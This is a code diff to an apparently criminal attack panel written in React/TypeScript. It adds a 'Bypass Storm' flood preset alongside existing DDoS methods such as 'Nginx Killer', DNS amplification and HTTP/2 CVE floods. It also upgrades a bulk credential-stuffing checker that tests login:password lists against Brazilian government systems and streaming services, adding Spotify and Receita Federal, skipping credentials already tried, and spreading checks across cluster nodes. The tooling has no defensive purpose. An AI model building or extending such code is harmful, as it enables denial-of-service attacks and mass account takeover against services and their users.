@@ -60,6 +60,7 @@ const L7_PROXY_OK = new Set([
 ]);
 const methodInfo = (m: string) => {
   if (m === "geass-override")       return { badge: "ARES ∞ [35V]",  cls: "geass",     color: "#C0392B" };
+  if (m === "bypass-storm")         return { badge: "BYPASS STORM",  cls: "geass",     color: "#5B2C6F" };
   if (m === "waf-bypass")           return { badge: "WAF BYPASS",    cls: "geass",     color: "#8E44AD" };
   if (m === "http2-flood")          return { badge: "CVE-2023",      cls: "real-http", color: "#1abc9c" };
   if (m === "http2-continuation")   return { badge: "CVE-2024",      cls: "real-http", color: "#e74c3c" };
@@ -108,6 +109,7 @@ function getSmartMethod(baseMethod: string, nodeIdx: number): string {
 /* ── Built-in presets ── */
 const PRESETS: Preset[] = [
   { label: "Geass Override", method: "geass-override",      packetSize: 512, duration: 300, delay: 0, threads: 3000, icon: "👁"  },
+  { label: "Bypass Storm",   method: "bypass-storm",        packetSize: 512, duration: 300, delay: 0, threads: 2000, icon: "🌪"  },
   { label: "Nginx Killer",   method: "http2-continuation",  packetSize: 64,  duration: 180, delay: 0, threads: 1000, icon: "💀"  },
   { label: "CF Bypass",      method: "waf-bypass",          packetSize: 512, duration: 300, delay: 0, threads: 1000, icon: "🌐"  },
   { label: "DNS Torture",    method: "dns-amp",             packetSize: 64,  duration: 180, delay: 0, threads: 128,  icon: "📛"  },
@@ -132,7 +134,7 @@ function getDomainKey(url: string): string {
 }
 
 /* ── Terminal log highlighter ── */
-const HIGHLIGHT_METHODS = ["http-flood","http-bypass","http2-flood","http2-continuation","slowloris","conn-flood","udp-flood","udp-bypass","syn-flood","tcp-flood","tcp-ack","tcp-rst","geass-override","dns-amp","ntp-amp","mem-amp","ssdp-amp","rudy","rudy-v2","waf-bypass","hpack-bomb","h2-settings-storm","graphql-dos","ws-flood","cache-poison","tls-renego","ssl-death","quic-flood","icmp-flood","http-pipeline","h2-rst-burst","grpc-flood","http-smuggling","slow-read","xml-bomb","range-flood","app-smart-flood","large-header-bomb","h2-ping-storm","http2-priority-storm","doh-flood","keepalive-exhaust"];
+const HIGHLIGHT_METHODS = ["http-flood","http-bypass","http2-flood","http2-continuation","slowloris","conn-flood","udp-flood","udp-bypass","syn-flood","tcp-flood","tcp-ack","tcp-rst","geass-override","bypass-storm","dns-amp","ntp-amp","mem-amp","ssdp-amp","rudy","rudy-v2","waf-bypass","hpack-bomb","h2-settings-storm","graphql-dos","ws-flood","cache-poison","tls-renego","ssl-death","quic-flood","icmp-flood","http-pipeline","h2-rst-burst","grpc-flood","http-smuggling","slow-read","xml-bomb","range-flood","app-smart-flood","large-header-bomb","h2-ping-storm","http2-priority-storm","doh-flood","keepalive-exhaust"];
 function highlightLog(text: string): React.ReactNode {
   // Segment the text into colored spans
   const parts: React.ReactNode[] = [];
@@ -639,7 +641,7 @@ function Panel() {
   const [isChecking, setIsChecking] = useState(false);
 
   /* ── Credential Bulk Checker ── */
-  type CredCheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma";
+  type CredCheckerTarget = "iseek" | "datasus" | "sipni" | "consultcenter" | "mind7" | "serpro" | "sisreg" | "credilink" | "serasa" | "crunchyroll" | "netflix" | "amazon" | "hbomax" | "disney" | "paramount" | "sinesp" | "serasa_exp" | "instagram" | "sispes" | "sigma" | "spotify" | "receita";
   interface CredResult { credential: string; login: string; status: "HIT" | "FAIL" | "ERROR"; detail?: string; }
   const [credTarget, setCredTarget]         = useState<CredCheckerTarget>(
     () => (localStorage.getItem("lb-cred-target") as CredCheckerTarget) ?? "consultcenter"
@@ -654,8 +656,22 @@ function Panel() {
   const [credErrors, setCredErrors]         = useState(0);
   const [credTab, setCredTab]               = useState<"hit" | "fail">("hit");
   const [credRecent, setCredRecent]         = useState<CredResult[]>([]);
+  const [credSkipped, setCredSkipped]       = useState(0);
+  const [credUseCluster, setCredUseCluster] = useState(() => localStorage.getItem("lb-cred-cluster") === "1");
   const credAbortRef                         = useRef<AbortController | null>(null);
   const credFileRef                          = useRef<HTMLInputElement>(null);
+
+  function getCheckedCredsKey(t: string) { return `lb-checked-creds-${t}`; }
+  function loadCheckedCreds(t: string): Set<string> {
+    try { return new Set(JSON.parse(localStorage.getItem(getCheckedCredsKey(t)) ?? "[]") as string[]); }
+    catch { return new Set(); }
+  }
+  function saveCheckedCreds(t: string, s: Set<string>) {
+    try { localStorage.setItem(getCheckedCredsKey(t), JSON.stringify([...s].slice(-5000))); } catch {}
+  }
+  function clearCheckedCreds(t: string) {
+    try { localStorage.removeItem(getCheckedCredsKey(t)); } catch {}
+  }
 
   /* Analyzer */
   const [analyzeResult, setAnalyzeResult] = useState<AnalyzeResult | null>(null);
@@ -800,9 +816,10 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
     s("lb-active-page",  activePage);
     s("lb-cred-target",  credTarget);
     s("lb-cred-text",    credText);
+    s("lb-cred-cluster", credUseCluster ? "1" : "0");
     s("lb-sound",        soundEnabled ? "1" : "0");
   }, [target, method, packetSize, duration, delay, threads, webhookUrl, showWebhook,
-      extraTargets, showMultiTarget, activePage, credTarget, credText, soundEnabled]);
+      extraTargets, showMultiTarget, activePage, credTarget, credText, credUseCluster, soundEnabled]);
 
   /* ── Theme class on body ── */
   useEffect(() => {
@@ -1530,8 +1547,11 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
     hbomax:       { label: "HBO Max",        icon: "👑", category: "Streaming" },
     disney:       { label: "Disney+",        icon: "🏰", category: "Streaming" },
     paramount:    { label: "Paramount+",     icon: "⭐", category: "Streaming" },
+    spotify:      { label: "Spotify",        icon: "🎵", category: "Streaming" },
+    // Consultas (CPF/dados públicos)
+    receita:      { label: "Receita Federal", icon: "🧾", category: "Consultas" },
   };
-  const CRED_CATEGORIES = ["Governo", "Finanças", "Social", "Streaming"];
+  const CRED_CATEGORIES = ["Governo", "Finanças", "Social", "Streaming", "Consultas"];
 
   function handleCredStop() {
     credAbortRef.current?.abort();
@@ -1539,8 +1559,20 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
   }
 
   async function handleCredStart() {
-    const lines = credText.split("\n").map(l => l.trim()).filter(Boolean);
-    if (!lines.length) { addLog("✕ Cole credenciais no formato login:senha", "error"); return; }
+    const rawLines = credText.split("\n").map(l => l.trim()).filter(Boolean);
+    if (!rawLines.length) { addLog("✕ Cole credenciais no formato login:senha", "error"); return; }
+
+    // ── Deduplicação: filtrar credenciais já testadas para este target ─────
+    const checked = loadCheckedCreds(credTarget);
+    const lines   = rawLines.filter(l => !checked.has(l));
+    const skipped = rawLines.length - lines.length;
+    setCredSkipped(skipped);
+    if (skipped > 0) addLog(`⏭ ${skipped} credencial(is) ignorada(s) — já testada(s) anteriormente`, "info");
+
+    if (!lines.length) {
+      addLog(`✕ Todas as ${rawLines.length} credenciais já foram testadas. Use "Limpar histórico" para repetir.`, "error");
+      return;
+    }
 
     setCredRunning(true);
     setCredTotal(lines.length);
@@ -1552,12 +1584,16 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
     setCredRecent([]);
     setCredTab("hit");
 
+    const sessionChecked = new Set<string>();
+
     const ac = new AbortController();
     credAbortRef.current = ac;
 
     try {
       const body: Record<string, unknown> = { credentials: lines, target: credTarget };
       if (webhookUrl.trim()) body.webhookUrl = webhookUrl.trim();
+      const activeCredCluster = credUseCluster ? clusterNodes.filter(n => n.trim()) : [];
+      if (activeCredCluster.length > 0) body.clusterNodes = activeCredCluster;
 
       const res = await fetch(`${BASE}/api/checker/stream`, {
         method: "POST",
@@ -1604,6 +1640,14 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 status:     ev.status ?? "ERROR",
                 detail:     ev.detail,
               };
+              // ── Dedup: mark credential as checked ──────────────────────────
+              sessionChecked.add(ev.credential);
+              // Persist incrementally every 10 checks to avoid excessive writes
+              if (sessionChecked.size % 10 === 0) {
+                const updated = loadCheckedCreds(credTarget);
+                sessionChecked.forEach(c => updated.add(c));
+                saveCheckedCreds(credTarget, updated);
+              }
               setCredDone(d => d + 1);
               if (r.status === "HIT") {
                 setCredHits(prev => [r, ...prev]);
@@ -1617,6 +1661,10 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
               }
               setCredRecent(prev => [r, ...prev].slice(0, 50));
             } else if (ev.type === "done") {
+              // Final persist of all session-checked creds
+              const finalChecked = loadCheckedCreds(credTarget);
+              sessionChecked.forEach(c => finalChecked.add(c));
+              saveCheckedCreds(credTarget, finalChecked);
               setCredRunning(false);
             }
           } catch { /**/ }
@@ -2090,6 +2138,17 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                 <div className="lb-cred-section-header">
                   <span className="lb-cred-section-icon">🎯</span>
                   <h3 className="lb-cred-section-title">Alvo</h3>
+                  {clusterNodes.filter(n => n.trim()).length > 0 && (
+                    <button
+                      className={`lb-cred-mini-btn ${credUseCluster ? "lb-cred-mini-btn--gold" : ""}`}
+                      style={{ marginLeft: "auto", fontSize: "11px" }}
+                      onClick={() => setCredUseCluster(v => !v)}
+                      disabled={credRunning}
+                      title={credUseCluster ? "Desativar distribuição em cluster" : `Distribuir credenciais entre ${clusterNodes.filter(n=>n.trim()).length + 1} nodes`}
+                    >
+                      {credUseCluster ? `🌐 Cluster (${clusterNodes.filter(n=>n.trim()).length + 1} nodes)` : "🌐 Usar Cluster"}
+                    </button>
+                  )}
                 </div>
                 {CRED_CATEGORIES.map(cat => (
                   <div key={cat} className="lb-cred-category">
@@ -2143,8 +2202,23 @@ interface OriginResult { domain: string; isCloudflare: boolean; originIPs: strin
                       onClick={() => setCredText("")}
                       disabled={credRunning || !credText}
                     >✕ Limpar</button>
+                    <button
+                      className="lb-cred-mini-btn"
+                      title="Apaga o histórico de credenciais já testadas para este alvo"
+                      onClick={() => {
+                        clearCheckedCreds(credTarget);
+                        setCredSkipped(0);
+                        addLog(`🗑 Histórico limpo para: ${CRED_TARGETS[credTarget]?.label ?? credTarget}`, "info");
+                      }}
+                      disabled={credRunning}
+                    >🗑 Histórico</button>
                     <input ref={credFileRef} type="file" accept=".txt,.csv" style={{ display: "none" }} onChange={handleCredFileUpload} />
                     <div style={{ flex: 1 }} />
+                    {credSkipped > 0 && !credRunning && (
+                      <span style={{ fontSize: "11px", color: "var(--color-text-muted)", alignSelf: "center", marginRight: "6px" }}>
+                        ⏭ {credSkipped} ignoradas
+                      </span>
+                    )}
                     {!credRunning ? (
                       <button
                         className="lb-cred-start-btn"
